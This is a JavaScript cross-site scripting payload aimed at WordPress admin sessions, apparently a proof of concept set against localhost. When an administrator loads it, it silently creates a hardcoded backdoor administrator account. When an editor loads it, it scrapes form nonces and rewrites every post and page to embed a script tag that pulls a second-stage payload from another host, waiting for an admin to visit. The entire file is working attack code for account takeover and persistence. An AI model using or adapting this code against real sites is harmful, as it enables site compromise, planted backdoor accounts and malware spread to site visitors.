
var site = "localhost";
var admin_bar = "wpadminbar";  					// check if user is logged in
var ap = "/wp-admin/profile.php";               // path to user profile
var pe = "/wp-admin/post.php";
var au = "/wp-admin/user-new.php";


var payload = "\n<script src=\"http://localhost:8080/stage2.js\">\n</script>";

var bd_username	=	"bd_admin";
var bd_password =	"bd_password";
var bd_email	=	"bd_admin@lan.lan";

var wpnonce;
var wp_http_referer;
var title;
var samplepermnonce;
var user_ID;
var post_author;
var post_ID;
var meta_box_nonce;
var closedboxnonce;
var content;
var ajax_addcat_nonce;
var ajax_addmeta_nonce;
var addcom_nonce;
var ajax_fl_nonce;

var mm;
var jj;
var aa;
var hh;
var mn;
var ss = 24;

var post_str;

var reg_wpnonce         =   /_wpnonce" value="([^]*?)"/;
var reg_wp_http_referer =   /_wp_http_referer" value="([^]*?)"/;
var reg_title           =   /name="post_title" size="\d{1,9}" value="([^]*?)"/;
var reg_sampleperm      =   /samplepermalinknonce" value="([^]*?)"/;
var reg_user_ID         =   /user_ID" value="(\d{1,9})"/;
var reg_post_author     =   /post_author" value="(\d{1,9})"/;
var reg_post_ID         =   /post_ID' value='(\d{1,9})'/;
var reg_meta_box_nonce  =   /meta-box-order-nonce" value="([^]*?)"/;
var reg_closedboxnonce  =   /closedpostboxesnonce" value="([^]*?)"/;
var reg_content         =   /id="content">([^*?]+)<\/textarea>/;
var reg_ajax_addcat     =   /_ajax_nonce-add-category" value="([^]*?)"/;
var reg_ajax_addmeta    =   /_ajax_nonce-add-meta" value="([^]*?)"/;
var reg_addcom_nonce    =   /add_comment_nonce" value="([^]*?)"/;
var reg_ajax_fl_nonce   =   /_ajax_fetch_list_nonce" value="([^]*?)"/;
var reg_new_user		=	/_wpnonce_create-user" value="([^]*?)"/;

var reg_mm              =   /hidden_mm" value="(\d{1,9})"/;
var reg_jj              =   /hidden_jj" value="(\d{1,9})"/;
var reg_aa              =   /hidden_aa" value="(\d{1,9})"/;
var reg_hh              =   /hidden_hh" value="(\d{1,9})"/;
var reg_mn              =   /hidden_mn" value="(\d{1,9})"/;


/*
 *  Decodes html encoded content
 */
function html_decode(text)
{
    var tmp = document.createElement('textarea');
    tmp.innerHTML = text;
    return tmp.innerText;
}

/*
 * Makes a GET request
 */

function get_request(url,callback)
{
    var xhttp = new XMLHttpRequest();
    // executed every time the status of the XMLHttpRequest object changes
    xhttp.onreadystatechange = function () {
        // readyState 4 == DONE
        // status 200   == successful_request
        if (this.readyState == 4 && this.status == 200){
            if (typeof callback == "function") {
                callback.apply(xhttp);
            }
        }
    }

    xhttp.open("GET",url,false);
    xhttp.send();
}

/*
 * GUESS WHAT!
 */

function post_request(url,data)
{
    var r = new XMLHttpRequest();
    r.open("POST",url,true);
    r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    r.send(data);

}

/*
 * Checks if the user is an administrator
 * by checking the admin panel elements
 * @true    user is admin
 * @false   user is not an admin
 */

function check_user_priv(html)
{
    //create dom element
    var del = document.createElement('html');
    del.innerHTML = html
    var wp_menu_array = del.getElementsByClassName("wp-menu-name");
    for(var i = 0; i < wp_menu_array.length; i++) {
        if(wp_menu_array[i].textContent == "Users")
        {
            // user is an admin :)
            // this method if checking perms
            // could fail if wordpress panel is used in another language
            return true;
		}
    }
    return false;
}

/*
 * Used to enumerate posts and pages
 * @returns a list of post_ids or page_ids
 */
function enum_pages(html)
{
	var page_codes = [];
	var del = document.createElement('html');
	del.innerHTML = html;
    var pages = del.getElementsByClassName("row-title");
    for(var i = 0; i < pages.length; i++)
    {
		page_codes.push(pages[i].href.split("post=")[1].split("&")[0]);
	}
	return page_codes

}



/*
 * Gets all the parameters needed from the post html form to backdoor the page
 */
function get_post_form(html)
{
	wpnonce =  reg_wpnonce.exec(html)[1];
	wp_http_referer = html_decode(reg_wp_http_referer.exec(html)[1]);
	samplepermnonce = reg_sampleperm.exec(html)[1];
	title = reg_title.exec(html)[1];
	user_ID = reg_user_ID.exec(html)[1];
	post_author = reg_post_author.exec(html)[1];
	post_ID = reg_post_ID.exec(html)[1];
	meta_box_nonce = reg_meta_box_nonce.exec(html)[1];
	closedboxnonce = reg_closedboxnonce.exec(html)[1];
	content = html_decode(reg_content.exec(html)[1]) + payload;
	ajax_addcat_nonce = reg_ajax_addcat.exec(html)[1];
	ajax_addmeta_nonce = reg_ajax_addmeta.exec(html)[1];
	addcom_nonce = reg_addcom_nonce.exec(html)[1];
	ajax_fl_nonce = reg_ajax_fl_nonce.exec(html)[1];
	mm = reg_mm.exec(html)[1];
	jj = reg_jj.exec(html)[1];
	aa = reg_aa.exec(html)[1];
	hh = reg_hh.exec(html)[1];
	mn = reg_mn.exec(html)[1];
	post_str = "_wpnonce=" + wpnonce + "&_wp_http_referer=" + wp_http_referer + "&user_ID=" + user_ID + "&action=editpost&originalaction=editpost" + "&post_author=" +     post_author + "&post_type=post" + "&original_post_status=publish" + "&referedby=" + encodeURIComponent("http://"+site+"/wp-admin/edit.php") +                              "&_wp_original_http_referer=" + encodeURIComponent("http://"+site+"/wp-admin/edit.php") + "&post_ID=" + post_ID + "&meta-box-order-nonce=" + meta_box_nonce +              "&closedpostboxesnonce=" + closedboxnonce + "&post_title="+ escape(title) + "&samplepermalinknonce=" + samplepermnonce + "&content=" + escape(content) + "&wp-             preview=&hidden_post_status=publish&post_status=publish&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password="+ "&mm=" + mm + "&jj=" + jj + "&aa=" + aa + "&hh=" + hh + "&mn=" + mn + "&ss=" + ss + "hidden_&mm=" + mm + "&hidden_jj=" + jj + "&hidden_aa=" + aa + "&hidden_hh=" + hh +  "&hidden_mn=" + mn  + "&cur_mm=" + mm + "&cur_jj=" + jj + "&cur_aa=" + aa + "&cur_hh=" + hh + "&cur_mn=" + mn+1  + "&original_publish=Update&save=Update&newcategory=" +   escape("New Category Name") + "&newcategory_parent=-1" + "&_ajax_nonce-add-category=" + ajax_addcat_nonce + "&tax_input[post_tag]=&newtag[post_tag]=&excerpt=&trackback_url=&metakeyinput=&metavalue=&advanced_view=&comment_status=open&ping_status=open";
	return post_str;
}

/*
 * Same but for pages, its only missing the ajax add cat value
 */

function get_page_form(html)
{
	wpnonce =  reg_wpnonce.exec(html)[1];
	wp_http_referer = html_decode(reg_wp_http_referer.exec(html)[1]);
	samplepermnonce = reg_sampleperm.exec(html)[1];
	title = reg_title.exec(html)[1];
	user_ID = reg_user_ID.exec(html)[1];
	post_author = reg_post_author.exec(html)[1];
	post_ID = reg_post_ID.exec(html)[1];
	meta_box_nonce = reg_meta_box_nonce.exec(html)[1];
	closedboxnonce = reg_closedboxnonce.exec(html)[1];
	content = html_decode(reg_content.exec(html)[1]) + payload;
	ajax_addmeta_nonce = reg_ajax_addmeta.exec(html)[1];
	addcom_nonce = reg_addcom_nonce.exec(html)[1];
	ajax_fl_nonce = reg_ajax_fl_nonce.exec(html)[1];
	mm = reg_mm.exec(html)[1];
	jj = reg_jj.exec(html)[1];
	aa = reg_aa.exec(html)[1];
	hh = reg_hh.exec(html)[1];
	mn = reg_mn.exec(html)[1];
	post_str = "_wpnonce=" + wpnonce + "&_wp_http_referer=" + wp_http_referer + "&user_ID=" + user_ID + "&action=editpost&originalaction=editpost" + "&post_author=" +     post_author + "&post_type=page" + "&original_post_status=publish" + "&referedby=" + encodeURIComponent("http://"+site+"/wp-admin/edit.php") +                              "&_wp_original_http_referer=" + encodeURIComponent("http://"+site+"/wp-admin/edit.php") + "&post_ID=" + post_ID + "&meta-box-order-nonce=" + meta_box_nonce +              "&closedpostboxesnonce=" + closedboxnonce + "&post_title="+ escape(title) + "&samplepermalinknonce=" + samplepermnonce + "&content=" + escape(content) + "&wp-             preview=&hidden_post_status=publish&post_status=publish&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password="+ "&mm=" + mm + "&jj=" + jj + "&aa=" + aa + "&hh=" + hh + "&mn=" + mn + "&ss=" + ss + "hidden_&mm=" + mm + "&hidden_jj=" + jj + "&hidden_aa=" + aa + "&hidden_hh=" + hh +  "&hidden_mn=" + mn  + "&cur_mm=" + mm + "&cur_jj=" + jj + "&cur_aa=" + aa + "&cur_hh=" + hh + "&cur_mn=" + mn+1  + "&original_publish=Update&save=Update&newcategory=" +   escape("New Category Name") + "&newcategory_parent=-1" + "&tax_input[post_tag]=&newtag[post_tag]=&excerpt=&trackback_url=&metakeyinput=&metavalue=&advanced_view=&comment_status=open&ping_status=open";
	return post_str;
}


/*
 *  Creates a backdoor admin user
 *  with the credentials specified in bd_username + bd_password
 */
function create_bd_user()
{
	var tmp;
	var unonce;
	get_request(au, function(){tmp = this.responseText;});
	unonce = reg_new_user.exec(tmp)[1];
	var post_data = "action=createuser&_wpnonce_create-user=" + unonce + "&user_login=" + bd_username + "&email=" + bd_email + "&pass1=" + bd_password + "&pass2=" + bd_password + "&role=administrator";
	post_request(au,post_data);
}


function main()
{
	var l = document.getElementById(admin_bar);
	if(l){
			// user is logged in
			var tmp;
			var tmp2;
			var p1;
			var p2;
			var is_adm;

			get_request(ap, function(){tmp = this.responseText})
			if(tmp){
					is_adm = check_user_priv(tmp);
					if(is_adm){
								// User is admin
								// add a new user
								create_bd_user();
					}else{
							// User is not an admin
							// This works for editors :)
							// So get each post, put our "payload" in it
							// Eventually an admin user will log in
            				setTimeout(get_request("/wp-admin/edit.php",function(){tmp = this.responseText}),1000);
							setTimeout(get_request("/wp-admin/edit.php?post_type=page", function(){tmp2 = this.responseText}),1000);
							if(tmp){
									var posts = [];
                					posts = enum_pages(tmp);
                					for(var i = 0; i < posts.length; i++){
											setTimeout(get_request("/wp-admin/post.php?post=" + posts[i] + "&action=edit", function(){p1 = this.responseText}),1000);
											if(p1){
													post_request(pe,post_str);
											}

									}
							}
							if(tmp2){
									 var pages = [];
									 pages = enum_pages(tmp2);
									 for(var i = 0; i < pages.length; i++){
											setTimeout(get_request("/wp-admin/post.php?post=" + pages[i] + "&action=edit", function(){p2 = this.responseText}),1000)
											if(p2){
													get_page_form(p2);
													post_request(pe,post_str);
											}
									}

							}
				}
		}
	}
}
window.onload = function() { main(); }

